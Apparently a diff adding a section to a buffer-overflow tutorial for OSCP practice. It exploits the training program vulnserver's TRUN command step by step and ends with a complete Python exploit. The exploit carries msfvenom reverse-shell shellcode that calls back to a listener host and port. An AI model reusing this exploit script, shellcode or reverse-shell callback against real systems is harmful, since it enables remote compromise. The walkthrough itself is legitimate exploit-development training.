@@ -852,3 +852,220 @@ From the last code you should get shell, also please note that I used 8 of NOP c
 
 ![bo-052.gif](/assets/images/bo-052.gif)
 **Figure 52** Reverse shell by exploiting crossfire.
+
+Now we going to look on the last example for that post, we have the vulnserver for windows machine, that vulnserver is like what we have used so far on linux, that is exe file that we going to explore, you can find the file [here](https://github.com/stephenbradshaw/vulnserver), while exploring that app, we going to use Immunity Debugger and check how to controll that app by buffer overflow it, also please note, I am skip the spiking path and jump directly into the process of overflow the vulnserver with `TRUN /.:/ ` string, if you want to test the spiking process you can download the [generic_send_tcp](https://github.com/guilhermeferreira/spikepp/blob/master/SPIKE/src/generic_send_tcp.c, this should be install on your kali linux by default, so you just need to run it:
+```
+└─$ generic_send_tcp                           
+argc=1
+Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
+./generic_send_tcp 192.168.1.100 701 something.spk 0 0
+```
+you should use stats.spk file that contain somthing like the followingfor run that code against the target:
+```
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+```
+
+The STATS in that case is the command that need to inserted to the target, so you can change the command it self and it will run that spiking against the target and try to overflow the program for each command option you will test.
+
+As I said, on our case vulnserver have vulnerable for `TRUN /.:/ ` with bunch of 'A', so we can run the following for crash it.
+```
+└─$ python2 -c 'print "TRUN /.:/" +"A"*5000'  | nc -nv 192.168.126.28 9999
+(UNKNOWN) [192.168.126.28] 9999 (?) open
+Welcome to Vulnerable Server! Enter HELP for help.
+
+```
+
+On the server side using ImmunityDebugger we will see that crash.
+
+![bo-053.png](/assets/images/bo-053.png)
+**Figure 53** The ESP instruction of EAX changes.
+
+So now let's check the location of the EIP with `msf-pattern_create`
+```
+└─$ msf-pattern_create -l 5000                      
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai...
+```
+
+![bo-054.png](/assets/images/bo-054.png)
+**Figure 54** The EIP was overflow.
+
+Now for the next step, we need to check the location of the EIP.
+
+```
+└─$ msf-pattern_offset -l 5000 -q 386f4337                          
+[*] Exact match at offset 2003
+
+```
+
+So now we need to overflow it by run 2003 chars and B's over the EIP.
+```
+└─$ python2 -c 'print "TRUN /.:/" +"A"*2003+"B"*4'  | nc -nv 192.168.126.28 9999                                   
+(UNKNOWN) [192.168.126.28] 9999 (?) open
+Welcome to Vulnerable Server! Enter HELP for help.
+```
+
+![bo-055.png](/assets/images/bo-055.png)
+**Figure 55** Overwrite the EIP.
+
+Now we can add more chars to check the offset we can insert, in my case I am use 500 C's to see if the EIP was not change location.
+
+```
+└─$ python2 -c 'print "TRUN /.:/" +"A"*2003+"B"*4+"C"*500'  | nc -nv 192.168.126.28 9999
+(UNKNOWN) [192.168.126.28] 9999 (?) open
+Welcome to Vulnerable Server! Enter HELP
+```
+![bo-056.png](/assets/images/bo-056.png)
+**Figure 56** The ESP contains the C's.
+
+You can see the I overflow the ESP with C's, so now we need to check bad chars.
+
+![bo-057.png](/assets/images/bo-057.png)
+**Figure 57** Bad chars check.
+
+It look like we have no bad chars, so now we need to create the reverse shell by using Msfvenom
+```
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.126.32 LPORT=443 EXITFUNC=thread -b '\x00' x86/alpha_mixed --platform windows -f python
+
+[-] No arch selected, selecting arch: x86 from the payload
+Found 12 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1745 bytes
+buf =  b""
+buf += b"\xdb\xd3\xbd\xa1\xce\x46\x71\xd9\x74\x24\xf4\x5a"
+buf += b"\x29\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x4b"
+buf += b"\x32\xa4\x84\x77\x23\xab\x67\x87\xb4\xcc\xee\x62"
+buf += b"\x85\xcc\x95\xe7\xb6\xfc\xde\xa5\x3a\x76\xb2\x5d"
+buf += b"\xc8\xfa\x1b\x52\x79\xb0\x7d\x5d\x7a\xe9\xbe\xfc"
+buf += b"\xf8\xf0\x92\xde\xc1\x3a\xe7\x1f\x05\x26\x0a\x4d"
+buf += b"\xde\x2c\xb9\x61\x6b\x78\x02\x0a\x27\x6c\x02\xef"
+buf += b"\xf0\x8f\x23\xbe\x8b\xc9\xe3\x41\x5f\x62\xaa\x59"
+buf += b"\xbc\x4f\x64\xd2\x76\x3b\x77\x32\x47\xc4\xd4\x7b"
+buf += b"\x67\x37\x24\xbc\x40\xa8\x53\xb4\xb2\x55\x64\x03"
+buf += b"\xc8\x81\xe1\x97\x6a\x41\x51\x73\x8a\x86\x04\xf0"
+buf += b"\x80\x63\x42\x5e\x85\x72\x87\xd5\xb1\xff\x26\x39"
+buf += b"\x30\xbb\x0c\x9d\x18\x1f\x2c\x84\xc4\xce\x51\xd6"
+buf += b"\xa6\xaf\xf7\x9d\x4b\xbb\x85\xfc\x03\x08\xa4\xfe"
+buf += b"\xd3\x06\xbf\x8d\xe1\x89\x6b\x19\x4a\x41\xb2\xde"
+buf += b"\xad\x78\x02\x70\x50\x83\x73\x59\x97\xd7\x23\xf1"
+buf += b"\x3e\x58\xa8\x01\xbe\x8d\x7f\x51\x10\x7e\xc0\x01"
+buf += b"\xd0\x2e\xa8\x4b\xdf\x11\xc8\x74\x35\x3a\x63\x8f"
+buf += b"\xde\x85\xdc\xf1\x3e\x6e\x1f\x0d\x3e\xd5\x96\xeb"
+buf += b"\x2a\x39\xff\xa4\xc2\xa0\x5a\x3e\x72\x2c\x71\x3b"
+buf += b"\xb4\xa6\x76\xbc\x7b\x4f\xf2\xae\xec\xbf\x49\x8c"
+buf += b"\xbb\xc0\x67\xb8\x20\x52\xec\x38\x2e\x4f\xbb\x6f"
+buf += b"\x67\xa1\xb2\xe5\x95\x98\x6c\x1b\x64\x7c\x56\x9f"
+buf += b"\xb3\xbd\x59\x1e\x31\xf9\x7d\x30\x8f\x02\x3a\x64"
+buf += b"\x5f\x55\x94\xd2\x19\x0f\x56\x8c\xf3\xfc\x30\x58"
+buf += b"\x85\xce\x82\x1e\x8a\x1a\x75\xfe\x3b\xf3\xc0\x01"
+buf += b"\xf3\x93\xc4\x7a\xe9\x03\x2a\x51\xa9\x24\xc9\x73"
+buf += b"\xc4\xcc\x54\x16\x65\x91\x66\xcd\xaa\xac\xe4\xe7"
+buf += b"\x52\x4b\xf4\x82\x57\x17\xb2\x7f\x2a\x08\x57\x7f"
+buf += b"\x99\x29\x72"
+```
+
+Now we also need return address, in Immunity Debugger we need to use `!mona` which is build in python module to find the location of nasm code in the modules, so in my case the value for JMP ESP is `\xff\xe4`.
+```
+└─$ msf-nasm_shell
+nasm > JMP ESP
+00000000  FFE4              jmp esp
+nasm >
+
+```
+
+On Immunity Debugging we need to run the following for finding the correct return address.
+```
+!mona modules
+```
+
+Then we need to search for modules that have no protection.
+
+![bo-058.png](/assets/images/bo-058.png)
+**Figure 58** Mona modules search.
+
+You can see there is dll without protection, so now we run the search for jump ESP by insert the nasm values related to that dll.
+```
+!mona find -s "\xff\xe4" -m "essfunc.dll"
+```
+
+![bo-059.png](/assets/images/bo-059.png)
+**Figure 59** Search the return address.
+
+So, in my case the return address should be "625011AF", so now I cam up with the following python script to test that.
+
+```py        
+#!/usr/bin/python3
+
+import socket
+
+target_ip = "192.168.126.28"
+target_port = 9999
+
+# Offset at 2003, EIP at 4 bytes after that (2007)
+offset = 2003
+eip = b"\xaf\x11\x50\x62"
+#eip = b"\x42\x42\x42\x42"
+
+slad = b"\x90" * 16
+
+# Generate all possible byte values
+buf =  b""
+buf += b"\xdb\xd3\xbd\xa1\xce\x46\x71\xd9\x74\x24\xf4\x5a"
+buf += b"\x29\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x4b"
+buf += b"\x32\xa4\x84\x77\x23\xab\x67\x87\xb4\xcc\xee\x62"
+buf += b"\x85\xcc\x95\xe7\xb6\xfc\xde\xa5\x3a\x76\xb2\x5d"
+buf += b"\xc8\xfa\x1b\x52\x79\xb0\x7d\x5d\x7a\xe9\xbe\xfc"
+buf += b"\xf8\xf0\x92\xde\xc1\x3a\xe7\x1f\x05\x26\x0a\x4d"
+buf += b"\xde\x2c\xb9\x61\x6b\x78\x02\x0a\x27\x6c\x02\xef"
+buf += b"\xf0\x8f\x23\xbe\x8b\xc9\xe3\x41\x5f\x62\xaa\x59"
+buf += b"\xbc\x4f\x64\xd2\x76\x3b\x77\x32\x47\xc4\xd4\x7b"
+buf += b"\x67\x37\x24\xbc\x40\xa8\x53\xb4\xb2\x55\x64\x03"
+buf += b"\xc8\x81\xe1\x97\x6a\x41\x51\x73\x8a\x86\x04\xf0"
+buf += b"\x80\x63\x42\x5e\x85\x72\x87\xd5\xb1\xff\x26\x39"
+buf += b"\x30\xbb\x0c\x9d\x18\x1f\x2c\x84\xc4\xce\x51\xd6"
+buf += b"\xa6\xaf\xf7\x9d\x4b\xbb\x85\xfc\x03\x08\xa4\xfe"
+buf += b"\xd3\x06\xbf\x8d\xe1\x89\x6b\x19\x4a\x41\xb2\xde"
+buf += b"\xad\x78\x02\x70\x50\x83\x73\x59\x97\xd7\x23\xf1"
+buf += b"\x3e\x58\xa8\x01\xbe\x8d\x7f\x51\x10\x7e\xc0\x01"
+buf += b"\xd0\x2e\xa8\x4b\xdf\x11\xc8\x74\x35\x3a\x63\x8f"
+buf += b"\xde\x85\xdc\xf1\x3e\x6e\x1f\x0d\x3e\xd5\x96\xeb"
+buf += b"\x2a\x39\xff\xa4\xc2\xa0\x5a\x3e\x72\x2c\x71\x3b"
+buf += b"\xb4\xa6\x76\xbc\x7b\x4f\xf2\xae\xec\xbf\x49\x8c"
+buf += b"\xbb\xc0\x67\xb8\x20\x52\xec\x38\x2e\x4f\xbb\x6f"
+buf += b"\x67\xa1\xb2\xe5\x95\x98\x6c\x1b\x64\x7c\x56\x9f"
+buf += b"\xb3\xbd\x59\x1e\x31\xf9\x7d\x30\x8f\x02\x3a\x64"
+buf += b"\x5f\x55\x94\xd2\x19\x0f\x56\x8c\xf3\xfc\x30\x58"
+buf += b"\x85\xce\x82\x1e\x8a\x1a\x75\xfe\x3b\xf3\xc0\x01"
+buf += b"\xf3\x93\xc4\x7a\xe9\x03\x2a\x51\xa9\x24\xc9\x73"
+buf += b"\xc4\xcc\x54\x16\x65\x91\x66\xcd\xaa\xac\xe4\xe7"
+buf += b"\x52\x4b\xf4\x82\x57\x17\xb2\x7f\x2a\x08\x57\x7f"
+buf += b"\x99\x29\x72"
+
+
+# Create buffer
+buffering = b"TRUN /.:/" + b"A" * offset + eip + slad + buf
+
+# Establish connection to target
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+
+# Send buffer
+sender = buffering
+s.send(sender)
+
+# Close connection
+s.close()
+
+```
+
+
+Then running that exploit against the target give use reverse shell to that windows server.
+
+![bo-060.gif](/assets/images/bo-060.gif)
+**Figure 60** Reverse shell on windows server.
+
+So now, we can end up that post, the first path to malware analysis is start on that buffer overflow, now you can also move forwarded for other attacks and get ready for the OSCP exam.
